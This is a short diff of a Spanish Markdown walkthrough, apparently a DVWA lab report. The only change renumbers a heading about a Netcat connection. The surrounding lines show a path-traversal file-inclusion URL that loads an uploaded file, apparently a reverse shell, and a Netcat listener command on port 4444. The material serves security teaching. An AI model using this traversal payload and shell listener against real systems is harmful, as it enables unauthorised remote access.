@@ -165,7 +165,7 @@ http://192.168.1.158/vulnerabilities/fi/?page=file/../../../hackable/uploads/rev
 ### **Captura de la Inclusión del Archivo**
 ![Inclusión de Archivo](assets/Captura9.png)
 
-## **6.4 Conexión con Netcat**
+## **5.4 Conexión con Netcat**
 Desde Kali Linux, se configuró un **oyente Netcat** con:
 ```bash
 nc -lvnp 4444
